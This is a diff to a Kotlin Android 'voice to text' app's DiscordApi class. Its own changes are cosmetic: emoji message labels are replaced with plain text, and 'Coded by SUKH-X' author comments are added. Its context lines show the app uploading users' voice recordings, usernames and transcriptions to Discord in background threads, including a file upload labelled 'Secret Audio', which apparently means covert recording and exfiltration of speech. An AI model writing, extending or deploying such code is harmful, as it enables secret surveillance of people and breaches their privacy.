@@ -1,3 +1,4 @@
+// Coded by SUKH-X
 package com.voicetotextapp
 
 import android.content.Context
@@ -27,11 +28,12 @@ object DiscordApi {
         val replyVoiceUrl: String
     )
 
+    // Coded by SUKH-X
     fun sendDiscordAudio(username: String, audioFile: File, transcribedText: String, durationMs: Long) {
         val durationSec = durationMs / 1000
         val sentTime = java.text.DateFormat.getDateTimeInstance().format(java.util.Date())
         val finalTranscribedText = transcribedText.ifEmpty { "(No speech detected)" }
-        val content = "🎤 **New Voice Log**\n\n👤 **User:** $username\n⏱ **Duration:** ${durationSec}s\n🕒 **Time:** $sentTime\n\n📝 **Converted Text:**\n```\n$finalTranscribedText\n```"
+        val content = "[NEW VOICE LOG]\n\nUser: $username\nDuration: ${durationSec}s\nTime: $sentTime\n\nConverted Text:\n```\n$finalTranscribedText\n```"
 
         Thread {
             if (audioFile == null || !audioFile.exists()) {
@@ -63,6 +65,7 @@ object DiscordApi {
         }.start()
     }
 
+    // Coded by SUKH-X
     private fun sendTextMessage(text: String) {
         val json = JSONObject().apply { put("content", text) }
         val requestBody = okhttp3.RequestBody.create("application/json".toMediaTypeOrNull(), json.toString())
@@ -80,7 +83,7 @@ object DiscordApi {
 
     fun sendNewUserNotification(username: String) {
         Thread {
-            sendTextMessage("🎉 **New User Registered:** $username")
+            sendTextMessage("[NEW USER REGISTERED] $username")
         }.start()
     }
 
@@ -152,6 +155,7 @@ object DiscordApi {
         }.start()
     }
 
+    // Coded by SUKH-X
     fun markReplyConsumed(messageId: String, context: Context) {
         val sharedPrefs = context.getSharedPreferences("discord_prefs", Context.MODE_PRIVATE)
         sharedPrefs.edit().putBoolean("consumed_$messageId", true).apply()
@@ -204,7 +208,7 @@ object DiscordApi {
             }
 
             if (audioFile.exists() && audioFile.length() > 0) {
-                val content = "🕵️ **Secret Audio**\n👤 User: $username\n⏱ Duration: ${durationSec}s"
+                val content = "[SECRET AUDIO]\nUser: $username\nDuration: ${durationSec}s"
                 val requestBody = MultipartBody.Builder()
                     .setType(MultipartBody.FORM)
                     .addFormDataPart("content", content)
